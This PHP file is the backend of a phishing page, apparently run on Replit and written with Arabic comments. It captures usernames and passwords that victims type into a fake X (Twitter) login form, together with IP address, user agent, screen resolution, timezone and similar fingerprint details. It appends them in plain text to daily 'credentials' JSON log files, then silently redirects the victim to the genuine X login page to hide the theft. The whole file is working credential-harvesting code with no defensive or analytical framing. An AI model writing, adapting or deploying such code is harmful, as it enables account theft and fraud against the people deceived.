<?php
// تعطيل عرض الأخطاء
error_reporting(0);
ini_set('display_errors', 0);

// رؤوس الأمان
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// تأكد من أن Replit يدعم الجلسات
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// معالجة بيانات التسجيل
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // تنظيف البيانات
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    // بيانات السجل
    $log_data = [
        'platform' => 'X',
        'timestamp' => $_POST['timestamp'] ?? date('c'),
        'username' => $username ?: 'N/A',
        'password' => $password ?: 'N/A',
        'ip_address' => $_POST['ip_address'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A',
        'user_agent' => $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'N/A',
        'language' => $_POST['language'] ?? 'N/A',
        'platform_info' => $_POST['platform'] ?? 'N/A',
        'screen_resolution' => $_POST['screen_resolution'] ?? 'N/A',
        'timezone' => $_POST['timezone'] ?? 'N/A',
        'cookies_enabled' => $_POST['cookies_enabled'] ?? 'N/A',
        'java_enabled' => $_POST['java_enabled'] ?? 'N/A',
        'replit_host' => true
    ];
    
    // إنشاء مجلد logs إذا لم يكن موجوداً
    if (!is_dir('logs')) {
        mkdir('logs', 0755, true);
    }
    
    // حفظ البيانات في ملف JSON
    $log_file = 'logs/credentials_' . date('Y-m-d') . '.json';
    $log_entry = json_encode($log_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . ",\n";
    
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // إعادة التوجيه إلى X الحقيقي
    header('Location: https://x.com/i/flow/login');
    exit();
} else {
    // إذا لم تكن POST، إعادة إلى الصفحة الرئيسية
    header('Location: index.html');
    exit();
}
?>
